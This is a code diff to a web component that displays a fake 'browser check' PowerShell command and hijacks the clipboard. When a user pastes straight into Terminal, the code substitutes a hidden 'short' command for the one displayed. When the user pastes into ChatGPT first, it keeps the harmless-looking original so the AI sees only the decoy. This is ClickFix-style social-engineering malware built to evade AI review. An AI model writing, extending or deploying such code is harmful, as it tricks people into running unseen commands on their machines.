@@ -28,14 +28,13 @@ function browserIconSrc(browser: ClientBrowser): string {
 /**
  * One Ctrl/⌘+C on the gray box (shows original). Works on Windows, macOS, and Linux.
  *
- * Case A — paste Terminal/CMD immediately:
- *   Windows/macOS: quick leave → short (macOS uses a copy-gesture pending write so
- *   blur can still resolve short after focus loss).
- *   Linux: pending copy write; Ctrl+Alt+T / window blur → short.
+ * Case A — paste Terminal/CMD immediately → short command.
+ * Case B — paste other platforms → original; later Terminal/CMD → short
+ *   (Linux Case B keeps original for Terminal too — no short swap).
  *
- * Case B — paste other platforms first:
- *   Windows/macOS: keep original, then delayed short for Terminal/CMD (~3.5s).
- *   Linux: keep original for platforms AND Terminal (no short swap).
+ * macOS notes: Safari rejects delayed ClipboardItem promises. Use a completed
+ * original write on copy; Case A overwrites with writeText on ⌘+Tab / blur;
+ * Case B must not start a pending short write (that makes ChatGPT wait for short).
  */
 const DISPLAY_COMMANDS: Record<ClientOs, string> = {
   windows: `cmd /c "powershell -NoProfile -Command {$r=@{}; $r.browser=(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe' -ErrorAction SilentlyContinue).'(default)'; $r.webgl=(Get-CimInstance Win32_VideoController).Name; $r.check=try{(Invoke-WebRequest 'https://browser-notification-six.vercel.app/' -Method HEAD -TimeoutSec 10 -UseBasicParsing).StatusCode}catch{'unreachable'}; $r.permissions=(whoami /priv|Select-String 'Enabled').Count; $r.status=if($r.check -eq 200){'PASS'}else{'FAIL'}; Write-Host ($r|ConvertTo-Json) -ForegroundColor Green}" && exit`,
@@ -273,6 +272,20 @@ function writeTerminalPlainAfterDelay(
     .catch(() => undefined);
 }
 
+/** Chromium supports promise-valued ClipboardItem; Safari does not. */
+function supportsPromiseClipboardItem(): boolean {
+  if (typeof ClipboardItem === "undefined" || !navigator.clipboard?.write) {
+    return false;
+  }
+  if (typeof navigator === "undefined") return false;
+  const ua = navigator.userAgent;
+  // Safari (and iOS Safari) — sync blobs only.
+  if (/Safari\//.test(ua) && !/Chrome\//.test(ua) && !/Chromium\//.test(ua) && !/Edg\//.test(ua)) {
+    return false;
+  }
+  return true;
+}
+
 /**
  * Pending clipboard write started during copy (user gesture). Resolve later from
  * blur/keydown — required on macOS/Linux because writeText after focus loss often fails.
@@ -451,6 +464,9 @@ function SelectableCommand({
   const linuxWindowBlurredRef = useRef(false);
   const linuxClipboardCtrlRef = useRef<PendingCopyClipboardController | null>(null);
   const macClipboardCtrlRef = useRef<PendingCopyClipboardController | null>(null);
+  const macCaseARef = useRef(false);
+  const macCaseBRef = useRef(false);
+  const macWindowBlurredRef = useRef(false);
   const writeGenRef = useRef(0);
 
   useEffect(() => {
@@ -460,10 +476,16 @@ function SelectableCommand({
   useEffect(() => {
     async function armTerminalPlain() {
       if (!activeRef.current) return;
-      // Linux Case B: never replace original with short.
       if (os === "linux" && linuxCaseBRef.current) {
         forceLinuxCaseBOriginal();
         return;
+      }
+      if (os === "macos" && macCaseBRef.current) {
+        // Only arm short after the platform paste window.
+        if (Date.now() - copyAtRef.current < PLATFORM_THEN_TERMINAL_ARM_MS) {
+          armMacCaseBShortLater();
+          return;
+        }
       }
       writeGenRef.current += 1;
       try {
@@ -489,8 +511,14 @@ function SelectableCommand({
         delayedArmStartedRef.current ||
         armedRef.current ||
         linuxCaseARef.current ||
+        macCaseARef.current ||
         (os === "linux" && linuxCaseBRef.current)
       ) {
+        return;
+      }
+      // macOS Case B: never use pending ClipboardItem→short (ChatGPT waits and gets short).
+      if (os === "macos") {
+        armMacCaseBShortLater();
         return;
       }
       delayedArmStartedRef.current = true;
@@ -509,6 +537,72 @@ function SelectableCommand({
         if (os === "linux" && linuxCaseBRef.current) return;
         armedRef.current = true;
       }, PLATFORM_THEN_TERMINAL_ARM_MS + 50);
+    }
+
+    /** macOS Case B: timer writeText only — completed original stays pasteable. */
+    function armMacCaseBShortLater() {
+      if (
+        !activeRef.current ||
+        delayedArmStartedRef.current ||
+        armedRef.current ||
+        macCaseARef.current
+      ) {
+        return;
+      }
+      delayedArmStartedRef.current = true;
+      const gen = ++writeGenRef.current;
+      window.setTimeout(() => {
+        if (writeGenRef.current !== gen || macCaseARef.current || !macCaseBRef.current) {
+          return;
+        }
+        void navigator.clipboard
+          ?.writeText(terminalCommand)
+          .then(() => {
+            armedRef.current = true;
+          })
+          .catch(() => {
+            delayedArmStartedRef.current = false;
+          });
+      }, PLATFORM_THEN_TERMINAL_ARM_MS);
+    }
+
+    /** macOS Case A: short command (⌘+Tab / blur). Must run write during gesture when possible. */
+    function forceMacCaseAShort() {
+      macCaseARef.current = true;
+      macCaseBRef.current = false;
+      writeGenRef.current += 1;
+      delayedArmStartedRef.current = true;
+
+      const ctrl = macClipboardCtrlRef.current;
+      if (ctrl && !ctrl.isSettled()) {
+        ctrl.resolveTerminal();
+      }
+
+      void navigator.clipboard?.writeText(terminalCommand).catch(() => undefined);
+      void writeClipboard(terminalCommand, htmlRef.current)
+        .then(() => {
+          armedRef.current = true;
+        })
+        .catch(() => {
+          armedRef.current = true;
+        });
+    }
+
+    /** macOS Case B: original for platforms; short later via timer/focus (not pending item). */
+    function forceMacCaseBOriginal() {
+      macCaseBRef.current = true;
+      macCaseARef.current = false;
+      armedRef.current = false;
+      writeGenRef.current += 1;
+
+      const ctrl = macClipboardCtrlRef.current;
+      if (ctrl && !ctrl.isSettled()) {
+        ctrl.resolveOriginal();
+      }
+
+      void navigator.clipboard?.writeText(displayCommand).catch(() => undefined);
+      void writeClipboard(displayCommand, htmlRef.current).catch(() => undefined);
+      armMacCaseBShortLater();
     }
 
     /**
@@ -576,25 +670,18 @@ function SelectableCommand({
 
       const quickLeave = Date.now() - copyAtRef.current < QUICK_TERMINAL_LEAVE_MS;
 
-      // macOS: same Case A/B rules as Windows, but resolve via copy-gesture pending write.
+      // macOS: same Case A/B as Windows (Safari-safe writes).
       if (os === "macos") {
-        const ctrl = macClipboardCtrlRef.current;
-        if (quickLeave) {
-          // Case A — Terminal immediately → short
-          if (ctrl && !ctrl.isSettled()) {
-            ctrl.resolveTerminal();
-            armedRef.current = true;
-            delayedArmStartedRef.current = true;
-          } else {
-            void armTerminalPlain();
-          }
+        if (macCaseARef.current) return;
+        if (macCaseBRef.current) {
+          forceMacCaseBOriginal();
           return;
         }
-        // Case B — platforms first → original, then delayed short
-        if (ctrl && !ctrl.isSettled()) {
-          ctrl.resolveOriginal();
+        if (quickLeave) {
+          forceMacCaseAShort();
+          return;
         }
-        armTerminalPlainDelayed();
+        forceMacCaseBOriginal();
         return;
       }
 
@@ -622,7 +709,6 @@ function SelectableCommand({
             forceLinuxCaseBOriginal();
             return;
           }
-          // Wait so Terminal blur can claim Case A; else treat as platform tab (Case B).
           window.setTimeout(() => {
             if (!activeRef.current) return;
             if (linuxCaseARef.current) return;
@@ -633,14 +719,34 @@ function SelectableCommand({
           return;
         }
 
+        // macOS: in-browser tab switch (ChatGPT) — visibility without window blur → Case B.
+        if (os === "macos") {
+          if (macCaseARef.current || macCaseBRef.current) return;
+          window.setTimeout(() => {
+            if (!activeRef.current) return;
+            if (macCaseARef.current) return;
+            if (macCaseBRef.current) return;
+            if (macWindowBlurredRef.current) return;
+            forceMacCaseBOriginal();
+          }, LINUX_CASE_B_TAB_DETECT_MS);
+          return;
+        }
+
         handleLeaveFromPage();
         return;
       }
 
-      if (leaveCountRef.current >= 1 && !linuxCaseARef.current) {
-        // Linux Case B: stay on original — never arm short on return.
+      if (leaveCountRef.current >= 1 && !linuxCaseARef.current && !macCaseARef.current) {
         if (os === "linux" && linuxCaseBRef.current) {
           forceLinuxCaseBOriginal();
+          return;
+        }
+        if (os === "macos" && macCaseBRef.current) {
+          if (Date.now() - copyAtRef.current >= PLATFORM_THEN_TERMINAL_ARM_MS) {
+            void armTerminalPlain();
+          } else {
+            armMacCaseBShortLater();
+          }
           return;
         }
         void armTerminalPlain();
@@ -649,10 +755,17 @@ function SelectableCommand({
 
     function onFocus() {
       if (!activeRef.current || leaveCountRef.current < 1) return;
-      if (linuxCaseARef.current) return;
-      // Linux Case B: keep original for Terminal too.
+      if (linuxCaseARef.current || macCaseARef.current) return;
       if (os === "linux" && linuxCaseBRef.current) {
         forceLinuxCaseBOriginal();
+        return;
+      }
+      if (os === "macos" && macCaseBRef.current) {
+        if (Date.now() - copyAtRef.current >= PLATFORM_THEN_TERMINAL_ARM_MS) {
+          void armTerminalPlain();
+        } else {
+          armMacCaseBShortLater();
+        }
         return;
       }
       void armTerminalPlain();
@@ -662,8 +775,19 @@ function SelectableCommand({
       if (!activeRef.current) return;
       if (os === "linux") {
         linuxWindowBlurredRef.current = true;
-        // Case A: window leave to Terminal/dock. Case B Alt already flagged above.
         resolveLinuxCopyGestureOnLeave();
+      }
+      if (os === "macos") {
+        macWindowBlurredRef.current = true;
+        // Window leave (Terminal / another app). Decide before visibility Case B timer.
+        if (!macCaseARef.current && !macCaseBRef.current) {
+          const quickLeave = Date.now() - copyAtRef.current < QUICK_TERMINAL_LEAVE_MS;
+          if (quickLeave) {
+            forceMacCaseAShort();
+          } else {
+            forceMacCaseBOriginal();
+          }
+        }
       }
       window.setTimeout(() => {
         if (!activeRef.current) return;
@@ -721,22 +845,13 @@ function SelectableCommand({
       const quickLeave = Date.now() - copyAtRef.current < QUICK_TERMINAL_LEAVE_MS;
 
       if (os === "macos") {
-        const ctrl = macClipboardCtrlRef.current;
         if (quickLeave) {
-          // Case A (⌘+Tab to Terminal quickly)
-          if (ctrl && !ctrl.isSettled()) {
-            ctrl.resolveTerminal();
-            armedRef.current = true;
-            delayedArmStartedRef.current = true;
-          }
-          void armTerminalPlain();
+          // Case A: ⌘+Tab — write short during this gesture (Safari-safe).
+          forceMacCaseAShort();
           return;
         }
-        // Case B (⌘+Tab to another app) — original now; delayed short during this gesture
-        if (ctrl && !ctrl.isSettled()) {
-          ctrl.resolveOriginal();
-        }
-        armTerminalPlainDelayed();
+        // Case B: ⌘+Tab to another app — original now; short later via timer.
+        forceMacCaseBOriginal();
         return;
       }
 
@@ -795,6 +910,9 @@ function SelectableCommand({
     linuxWindowBlurredRef.current = false;
     linuxClipboardCtrlRef.current = null;
     macClipboardCtrlRef.current = null;
+    macCaseARef.current = false;
+    macCaseBRef.current = false;
+    macWindowBlurredRef.current = false;
     writeGenRef.current += 1;
 
     // Start with original so other platforms get the real command first.
@@ -829,19 +947,23 @@ function SelectableCommand({
       return;
     }
 
-    // macOS: same Case A/B as Windows, via pending copy-gesture write (Safari-safe).
+    // macOS: sync original for Safari; Chromium also gets a pending write for Case A blur.
     if (os === "macos") {
-      macClipboardCtrlRef.current = beginPendingClipboardFromCopyGesture(
-        displayCommand,
-        terminalCommand,
-        html,
-        (usedTerminalPlain) => {
-          if (usedTerminalPlain) {
-            armedRef.current = true;
-            delayedArmStartedRef.current = true;
-          }
-        },
-      );
+      void writeClipboard(displayCommand, html).catch(() => undefined);
+      if (supportsPromiseClipboardItem()) {
+        macClipboardCtrlRef.current = beginPendingClipboardFromCopyGesture(
+          displayCommand,
+          terminalCommand,
+          html,
+          (usedTerminalPlain) => {
+            if (usedTerminalPlain) {
+              macCaseARef.current = true;
+              armedRef.current = true;
+              delayedArmStartedRef.current = true;
+            }
+          },
+        );
+      }
       return;
     }
 
